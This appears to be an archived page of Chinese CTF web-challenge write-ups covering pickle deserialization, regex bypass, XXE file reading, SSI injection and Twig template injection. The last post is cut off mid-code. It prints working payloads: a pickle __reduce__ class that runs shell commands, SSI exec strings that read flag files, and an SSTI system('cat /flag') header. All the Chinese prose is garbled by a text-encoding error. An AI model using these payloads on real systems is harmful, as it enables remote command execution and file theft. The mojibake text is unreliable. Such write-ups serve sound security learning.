<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/93.PNG?raw=true" alt="93.PNG"></p>
<p>é¢˜ç›®è¿™è¾¹æç¤º<strong>pickle</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pickleæˆ–cPickleï¼Œä½œç”¨å’ŒPHPçš„serializeä¸unserializeä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒ</span><br><span class="line">pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ªæ ‡å‡†æ¨¡å—ï¼Œå®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</span><br><span class="line">pickleæ¨¡å—æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆä¿å­˜æ–‡ä»¶çš„åç¼€ä¸º.pklï¼‰ï¼Œä¸èƒ½ç›´æ¥æ‰“å¼€è¿›è¡Œé¢„è§ˆã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#åºåˆ—åŒ–</span><br><span class="line">pickle.dump(obj, file, protocol=None,)</span><br><span class="line">objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line">fileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line">#ååºåˆ—åŒ–</span><br><span class="line">pickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;, buffers=None)</span><br><span class="line">fileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)</span><br></pre></td></tr></table></figure>

<p>è®²è§£pickleååºåˆ—åŒ–æ¼æ´çš„æ–‡ç« <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/108919605">https://blog.csdn.net/qq_43431158/article/details/108919605</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setting.pyé‚£è¾¹æœ‰ä¸ªhint ä¸€ä¸²Unicode è§£ç ä¸€ä¸‹</span><br><span class="line"></span><br><span class="line">è¿™ç½‘ç«™ä¸ä»…å¯ä»¥ä»¥è–…ç¾Šæ¯›ï¼Œæˆ‘è¿˜ç•™äº†ä¸ªåé—¨ï¼Œå°±è—åœ¨lv6é‡Œ  </span><br></pre></td></tr></table></figure>

<p>åˆšæ‰lv6è´­ä¹°åé‚£è¾¹æç¤ºè¦adminæƒé™é‚£å¯èƒ½åœ¨ä¸€ä¸ªå«åšadminçš„æ–‡ä»¶é‡Œé¢<br>admin.py é‡Œé¢å‘ç°äº†pickle</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/94.PNG?raw=true" alt="94.PNG"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.render(&#x27;form.html&#x27;, res=p, member=1) </span><br></pre></td></tr></table></figure>

<p>æ„æ€æ˜¯æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶è¿›è¡Œæ¸²æŸ“ç„¶åæ˜¾ç¤ºç”»é¢<br>çœ‹ä¸€ä¸‹form.html </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/95.PNG?raw=true" alt="95.PNG"></p>
<p>ä¼ å…¥å¯ä»¥ç›´æ¥å›æ˜¾å¹¶å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå­˜åœ¨pickleååºåˆ—åŒ–æ¼æ´ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ª<strong>pickle.dumpsåºåˆ—åŒ–payloadï¼Œä»è€Œè¢«è§£æè¯»å–ä¸œè¥¿</strong><br>payloadæ„é€ ä½¿ç”¨_ <em>ruduce</em> _(self)éœ€è¦å…ˆè·å–flagçš„ä½ç½®åè¿›è¡Œè¯»å–<br>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å®Œæˆåé€€å‡ºè¿”å›ç»“æœæ˜¯å‘½ä»¤è¡Œæ‰§è¡ŒçŠ¶æ€ä¸€èˆ¬æ˜¯0<br>os.popen() æ— æ³•è¿›è¡Œè¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼<br>è¿™ä¿©åªèƒ½printè¾“å‡ºæ˜¯æ‰æœ‰å›æ˜¾ï¼Œä»¥returnè¿”å›æ²¡æœ‰å›æ˜¾<br>ä½¿ç”¨commands.getoutput()è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œä»£æ›¿</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure>

<p>è·‘å¾—ccommands%0Agetoutput%0Ap0%0A%28S%27ls%20/%27%0Ap1%0Atp2%0ARp3%0A.<br>ç„¶åå‘åŒ…</p>
<p>flagåœ¨flag.txt<br>(â€˜ls /â€˜,)-&gt;(â€˜cat /flag.txtâ€™)<br>å°±å¥½äº†</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-84/" data-id="ckrorcwtd0000uow7eabpa9g0" data-title="CISCN2019 ååŒ—èµ›åŒº Day1 Web2ikun" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-83" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-83/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:31.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-83/">MRCTF2020å¥—å¨ƒ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">//1st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å³é”®æŸ¥çœ‹æºç æœ‰è¿™ä¹ˆä¸€æ®µ<br><strong>substr_count()</strong> å‡½æ•°æé™å­—ä¸²åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ¬¡æ•° æœ‰åŒºåˆ†å¤§å°å†™<br><strong>%20ä»£æ›¿ä¸‹åˆ’çº¿æˆ–è€…%5F ä»è€Œç»•è¿‡ç¬¬ä¸€ä¸ªif</strong><br>ä»<strong>getå‹ä¸­å–å¾—å‚æ•°b_u_p_t ä¸ç­‰äº23333ä½†æ˜¯æ­£åˆ™åŒ¹é…éœ€è¦23333å¯ä»¥ä½¿ç”¨%0a</strong>(æ­£åˆ™åŒ¹é…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸­&#x27;^&#x27; å’Œ &#x27;$&#x27;</span><br></pre></td></tr></table></figure>

<p>ä»£è¡¨èˆªé“å¼€å¤´å’Œç»“å°¾å¯ä»¥åˆ©ç”¨æ¢è¡Œç»•è¿‡ï¼‰ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š b%20u%20p%20t=23333%a æˆ–è€…b%5Fu%5Fp%5Ft=23333%a</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/97.PNG?raw=true" alt="97.PNG"></p>
<p>æç¤ºè¿™ä¸ªè®¿é—®ä¸€ä¸‹å³é”®æŸ¥çœ‹æºç <br>ä¸€<strong>é•¿ä¸²æ³¨é‡Šæ˜¯jsfuckçš„ä¸¢æ§åˆ¶å°</strong></p>
<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/99.PNG?raw=true" alt="99.PNG"><br>ä¼ å…¥<strong>å‚æ•°åè·³è½¬</strong></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/98.PNG?raw=true" alt="98.PNG"></p>
<p>éœ€è¦ipåœ°å€ä¸º127.0.0.1 æŠ“åŒ…é‚£è¾¹å¡«ä¸€ä¸‹client-ip:127.0.0.1</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/100.PNG?raw=true" alt="100.PNG"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents å¯ç”¨phpä¼ªåè®®</span><br><span class="line">2333=php://input</span><br><span class="line">post: todat is a happy day</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">changeå‡½æ•°çš„ä½œç”¨ï¼Œä¼ å…¥çš„å‚æ•°å…ˆè¿›è¡Œbase64è§£ç ï¼Œç„¶åå°†å­—ç¬¦è½¬åŒ–æˆASCIIå¹¶ä¸”+$i*2</span><br></pre></td></tr></table></figure>

<p>åå†™changeå‡½æ•° </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re = &#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag = unchange(&#x27;flag.php&#x27;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¿™ä¸²ZmpdYSZmXGI=</p>
<p>æŠ“åŒ…æ”¹åŒ…ok</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/101.PNG?raw=true" alt="101.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-83/" data-id="ckrorcwtj0002uow79o4jh6ni" data-title="MRCTF2020å¥—å¨ƒ" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-82" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-82/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:29.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-82/">NCTF2019True XML cookbook</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿™è¾¹æ˜¯xxeæ¼æ´**<br> XXE ï¼šXml External Entity å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»**<br>æ˜¯åˆ©ç”¨ä¸€ç§xmlçš„è¯­è¨€è¿›è¡Œçš„æ³¨å…¥æ”»å‡»<br>æ„é€ å‡çš„xmlè¯­è¨€è¿›è¡Œæ³¨å…¥æ”»å‡» <strong>ä¹‹å‰[NCTF2019]fakeXMLcookbookä¹Ÿåˆ©ç”¨åˆ°xxeæ¼æ´</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxeæ¼æ´å¯ä»¥è¿›è¡Œä¸€å †çš„ç¥å¥‡æ“ä½œ</span><br><span class="line">è¯»å–ç³»ç»Ÿæ–‡ä»¶ </span><br><span class="line">è·å–æºä»£ç </span><br><span class="line">è¿›è¡Œssrf</span><br><span class="line">è¿›è¡ŒPharè§¦å‘ååºåˆ—åŒ– </span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜è¿™è¾¹å¯ä»¥è¿›è¡Œssrfæ”»å‡»æ¢æµ‹å†…ç½‘ä¸»æœº<br>è¿™è¾¹å¯ä»¥ç”¨file:// æˆ–è€…php:// ç­‰ä¼ªåè®®è¿›è¡Œè·å–æ–‡ä»¶ï¼ˆè·å–ä»£ç æœ€å¥½ç”¨php://filterè¿›è¡Œbase64è½¬ç ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ ï¼š</span><br><span class="line">/etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜</span><br><span class="line">/etc/passwd ç”¨æˆ·å¯†ç </span><br><span class="line">/proc/net/arp æ¯ä¸ªç½‘ç»œæ¥å£çš„arpè¡¨ä¸­devåŒ…</span><br><span class="line">/proc/net/arp è·å–ip</span><br></pre></td></tr></table></figure>

<p>ç„¶å /etc/hostså‘ç°å†…ç½‘åœ°å€</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/75.PNG?raw=true" alt="75.PNG"></p>
<p>ä½†æ˜¯æ²¡æœ‰å½“å‰ip</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/76.PNG?raw=true" alt="76.PNG"></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/77.PNG?raw=true" alt="77.PNG"></p>
<p>ç„¶ååˆ©ç”¨burpçš„çˆ†ç ´æ¨¡å—è¿›è¡Œæ‰«æå†…ç½‘ä¸»æœºç„¶ååœ¨10.0.48.6æ‹¿åˆ°flag</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/78.PNG?raw=true" alt="78.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-82/" data-id="ckrorcwti0001uow75e0ceyd6" data-title="NCTF2019True XML cookbook" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-81" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-81/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:27.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è€æ ·å­è¿˜æ˜¯å¾—æ‰«åå°æ‰«åˆ°ä¸€ä¸ªindex.php.swp è¿›å…¥åç»™äº†æºç  é‡ç‚¹æ˜¯è¿™éƒ¨åˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br></pre></td></tr></table></figure>

<p><strong>åªè¦æœ‰ä¸€ä¸ªå¯†ç å‰å…­ä½çš„MD5æ˜¯6d0bc1 è·‘è„šæœ¬ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a= <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> a:</span><br><span class="line">                        <span class="keyword">for</span> u <span class="keyword">in</span> a:</span><br><span class="line">                            b = <span class="built_in">str</span>(o)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(q)+<span class="built_in">str</span>(r)+<span class="built_in">str</span>(s)+<span class="built_in">str</span>(t)+<span class="built_in">str</span>(u)</span><br><span class="line">                            md5 = hashlib.md5(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> ((md5[<span class="number">0</span>:<span class="number">6</span>])==<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">                                <span class="built_in">print</span> b</span><br></pre></td></tr></table></figure>

<p><strong>2020666</strong><br><strong>2305004</strong><br><strong>9162671</strong>  è¿™ä»¨ç»“æœéšä¾¿é€‰ä¸€ä¸ª <strong>username=2020666&amp;password=2020666</strong><br>ç„¶åæŠ“åŒ…å‘ç°è¿™è¾¹å¥½åƒä¼šå†™å…¥ä¸€ä¸ª.shtml çš„æ–‡ä»¶å¯ä»¥è®¿é—®</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/68.PNG?raw=true" alt="68.PNG"></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/69.PNG?raw=true" alt="69.PNG"></p>
<p>ç™¾åº¦äº†ä¸€ä¸‹è¿™è¾¹å¯ä»¥<strong>è¿›è¡Œssiæ³¨å…¥</strong> </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/70.PNG?raw=true" alt="70.PNG"></p>
<p>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/12027775.html">https://www.cnblogs.com/bonelee/p/12027775.html</a><br>å¯ä»¥è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œ  </p>
<p>ä¼ ä¸ªlsè¯•è¯• </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/67.PNG?raw=true" alt="67.PNG"></p>
<p>å¯ä»¥è®¿é—®åˆ°butè¯¥æ–‡ä»¶ flagä¸åœ¨è¿™     </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/72.PNG?raw=true" alt="72.PNG"></p>
<p>è¿”å›ä¸Šä¸€ä¸ªç›®å½• </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&amp;password=2020666  </span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/74.PNG?raw=true" alt="74.PNG"></p>
<p>çœ‹æ ·å­å¯ä»¥æ‰¾åˆ°flag<br>ä¼ å…¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>

<p> è®¿é—®ç”Ÿæˆçš„æ–‡ä»¶ ok</p>
<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/73.PNG?raw=true" alt="73.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-81/" data-id="ckror35r5000014w7b9ee493h" data-title="BJDCTF2020EasySearch" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-80" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-80/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:20:09.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-80/">CISCN2019 åä¸œå—èµ›åŒºWeb11</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å’Œ[BJDCTF2020]The mystery of ip   è¿™ä¸ªå¾ˆç±»ä¼¼<br>æŠ“åŒ… é€šè¿‡X-Forwarded-For æ¥æ‰¾ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For= &#123;&#123;7*&#x27;7&#x27;&#125;&#125;  å›æ˜¾49==&gt; Twig </span><br><span class="line">ç›´æ¥å°±X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;å°±å¯ä»¥</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/66.PNG?raw=true" alt="66.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-80/" data-id="ckror75540000p8w7ep885i7h" data-title="CISCN2019 åä¸œå—èµ›åŒºWeb11" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-79" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/21/page-79/" class="article-date">
  <time class="dt-published" datetime="2021-07-21T13:29:35.000Z" itemprop="datePublished">2021-07-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span 